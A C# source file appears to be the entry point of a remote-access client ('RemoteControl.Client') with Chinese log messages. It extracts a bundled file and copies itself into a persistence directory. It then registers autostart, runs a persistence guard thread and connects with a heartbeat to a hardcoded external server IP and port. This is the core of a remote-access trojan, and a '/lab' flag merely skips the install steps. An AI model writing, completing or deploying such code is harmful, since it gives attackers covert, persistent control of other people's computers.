using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    partial class Program
    {
        private static Socket oServer;
        private static SocketSession oServerSession;
        private static ClientParameters clientParameters;
        private static bool isTestMode = true;
        private static bool labMode = false;
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;
        private static Dictionary<ePacketType, IRequestHandler> handlers = new Dictionary<ePacketType, IRequestHandler>();
        const string MutexName = "RemoteControl.Client";
        const string DefaultClientFileName = "RemoteControlClient.exe";
        private static readonly bool CustomerSafeMode = false;
        private static string logFilePath = "";

        static void Main(string[] args)
        {
            try
            {
                InitializeLogging();
                DoOutput("客户端启动");
                ExtractBundledFile();

                if (args.Length == 1 && args[0].StartsWith("/delay:"))
                {
                    string str = args[0].Substring("/delay:".Length);
                    int delay = Convert.ToInt32(str);
                    Thread.Sleep(delay);
                    args = new string[] { };
                }

                args = ParseStartupOptions(args);
                ReadParameters();
                if (!ValidateClientParameters())
                {
                    DoOutput("客户端参数无效，请重新生成客户端。");
                    return;
                }

                if (args.Length == 0 || (args.Length == 1 && args[0] == "/r"))
                {
                    RunClient();
                    return;
                }

                DoOutput("启动参数不支持: " + string.Join(" ", args));
            }
            catch (Exception ex)
            {
                DoOutput("客户端异常退出: " + ex);
            }
        }

        static void RunClient()
        {
            // 自动安装到持久化目录
            if (!labMode && EnsureInstalled())
                return; // 已从安装目录重新启动，当前进程退出

            string mutexName = labMode ? MutexName + ".Lab" : MutexName;
            if (CommonUtil.IsMultiRun(mutexName))
            {
                DoOutput("客户端已在运行，本次启动退出。");
                return;
            }

            if (!labMode)
                EnsureAutoStart();
            else
                DoOutput("Lab mode enabled: install, autostart, and persistence guard are skipped.");
            InitHandlers();
            StartConnect();
            heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
            heartbeatThread.Start();

            // 启动持久化守护线程
            if (!labMode)
                new Thread(PersistenceGuard) { IsBackground = true }.Start();
            StartMonitor();
        }

        static string[] ParseStartupOptions(string[] args)
        {
            List<string> filtered = new List<string>();
            foreach (string arg in args)
            {
                if (string.Equals(arg, "/lab", StringComparison.OrdinalIgnoreCase))
                {
                    labMode = true;
                    continue;
                }

                filtered.Add(arg);
            }

            return filtered.ToArray();
        }



        static void ReadParameters()
        {
            if (isTestMode)
            {
                clientParameters = new ClientParameters();
                clientParameters.InitHeader();
                clientParameters.SetServerIP("203.91.76.159");
                clientParameters.ServerPort = 10010;
                clientParameters.OnlineAvatar = "";
                clientParameters.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                clientParameters = ClientParametersManager.ReadParameters(filePath); 
            }
            DoOutput("参数信息: IP=" + clientParameters.GetServerIP() + ", PORT=" + clientParameters.ServerPort +
                ", NAME=" + GetConfiguredClientFileName());
        }

        static bool ValidateClientParameters()
        {
            if (!isTestMode && (clientParameters.Header == null || clientParameters.Header.Length != 4))
                return false;

            if (clientParameters.ServerPort <= 0 || clientParameters.ServerPort > 65535)
                return false;

            IPAddress address;
            return IPAddress.TryParse(clientParameters.GetServerIP(), out address);
        }

        static string GetConfiguredClientFileName()
        {
            if (!string.IsNullOrWhiteSpace(clientParameters.ServiceName))
                return clientParameters.ServiceName;
            return DefaultClientFileName;
        }



    }
}
